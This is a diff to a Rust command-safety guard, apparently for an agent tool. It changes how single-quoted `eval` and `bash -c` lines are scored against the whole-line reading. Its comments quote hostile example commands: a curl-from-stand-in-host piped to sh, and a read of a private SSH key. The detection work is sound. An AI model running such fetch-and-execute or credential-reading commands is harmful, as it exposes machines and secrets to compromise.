@@ -2958,6 +2958,44 @@ fn analyze_command_at(
         analysis.command = command.trim().to_string();
         return analysis;
     }
+    // A line that only runs a single-quoted literal (`eval '<code>'`, `bash
+    // -c '<code>'`) runs exactly that code: when the code is allowed written
+    // out, so is the line, and the words quoted inside the code are data, as
+    // they are there. When the code has a finding, the stricter of the two
+    // readings stands, so the line is never judged below the whole-line
+    // reading (`bash -c 'curl https://x | sh'` stays refused).
+    // Only the line as sent: a line handed on inside it is read level by
+    // level, and a level unwrapped here would go uncounted (a third `sh -c`
+    // is refused unread, `destructive_inside_shell_line.rs`).
+    let literal = (depth == 0)
+        .then(|| sole_literal_shell_code(command))
+        .flatten()
+        .map(|code| {
+            let mut analysis =
+                analyze_command_at(code, rule_engine, protected_reads, context, depth);
+            analysis.command = command.trim().to_string();
+            analysis
+        });
+    if let Some(analysis) = literal.as_ref().filter(|a| a.recommendation == "allow") {
+        return analysis.clone();
+    }
+    let whole =
+        analyze_command_both_readings(command, rule_engine, protected_reads, context, depth);
+    match literal {
+        Some(analysis) if analysis.risk_score >= whole.risk_score => analysis,
+        _ => whole,
+    }
+}
+
+/// The bash reading and, where they differ, the sh and dash reading of
+/// `command` (see [`analyze_command_at`]): the one that scores higher.
+fn analyze_command_both_readings(
+    command: &str,
+    rule_engine: Option<&RuleEngine>,
+    protected_reads: &[String],
+    context: Option<&WorkingContext>,
+    depth: u8,
+) -> CommandAnalysis {
     let as_bash = analyze_command_as_read(command, rule_engine, protected_reads, context, depth);
     if !command.contains("&>") {
         return as_bash;
@@ -2977,6 +3015,33 @@ fn analyze_command_at(
     } else {
         as_bash
     }
+}
+
+/// The code of a line that is nothing but `eval '<code>'` or `bash -c
+/// '<code>'` (`sh`, `dash`, `zsh`, `ksh`, by name or under `/bin` or
+/// `/usr/bin`): one single-quoted word the shell hands over as written,
+/// with no parameter after it.
+///
+/// Such a line runs exactly the code: when the code is allowed written out,
+/// so is the line, and when it has a finding the line is never judged
+/// below either reading ([`analyze_command_at`]). Read as one line, the quotes
+/// inside the code were lost: `bash -c 'grep "cat ~/.ssh/id_rsa" notes.md'`
+/// was refused as a key read where the grep alone is allowed, and `eval
+/// 'git status'` was refused as a shell eval (measured 2026-11-19). Anything
+/// else on the line (a second word, a pipe, `;`, a redirection, a double
+/// quote the shell would expand) leaves it to the whole-line reading.
+fn sole_literal_shell_code(command: &str) -> Option<&str> {
+    static SOLE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    let sole = SOLE.get_or_init(|| {
+        regex::Regex::new(
+            r"^[\t ]*(?:eval|(?:/usr)?(?:/bin/)?(?:bash|sh|dash|zsh|ksh)[\t ]+-c)[\t ]+'([^']*)'[\t ]*$",
+        )
+        .expect("static sole literal regex")
+    });
+    sole.captures(command)
+        .and_then(|found| found.get(1))
+        .map(|code| code.as_str())
+        .filter(|code| !code.trim().is_empty())
 }
 
 /// Where the guard's own program is installed, as a person or an installer
